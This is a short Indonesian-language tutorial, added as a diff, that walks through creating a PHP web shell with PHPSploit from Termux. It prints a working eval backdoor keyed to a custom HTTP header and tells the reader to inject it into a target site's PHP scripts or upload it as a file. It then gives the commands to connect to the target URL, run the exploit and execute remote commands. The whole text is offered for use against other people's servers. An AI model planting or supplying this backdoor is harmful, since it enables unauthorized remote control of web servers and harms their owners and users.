@@ -1,0 +1,19 @@
+• mula-mula persiapkan web yang akan mau di reverse shell
+• lalu masuk dan Creat payload dengan cara dibawah ini
+- ./phpsploit
+- $phpsploit > set PASSKEY NEROGATIV13
+• maka akan menghasilkan kode:
+- <?php @eval($_SERVER['HTTP_NEROGATIV13']); ?>
+• Kalian bisa menyisipkan kode remote tersebut ke dalam skrip 
+file PHP di server web, atau bisa juga dengan menyimpannya misal Nerogativ13.php Dan kalian upload ke server target web kalian.
+• Dan untuk melakukan reverse shell nya kalian bisa masuk lagi ke aplikasi Termux kalian. 
+lalu jalankan Phpsploit. 
+- $phpsploit > set TARGET http://vulnwebtarget.com/Nerogativ13.php 
+• Lalu kalian tekan Enter dan masukan perintah:
+- $phpsploit > exploit 
+- Tekan Enter 
+• Dan boom kalian berhasil melakukan backconnect dengan Phpsploit 
+kalian tidak perlu repot lagi untuk melakukan bind port, 
+jalankan ngrok atau semacamnya. Dan untuk mengeceknya kalian bisa 
+jalankan:
+- $phpsploit > run ls
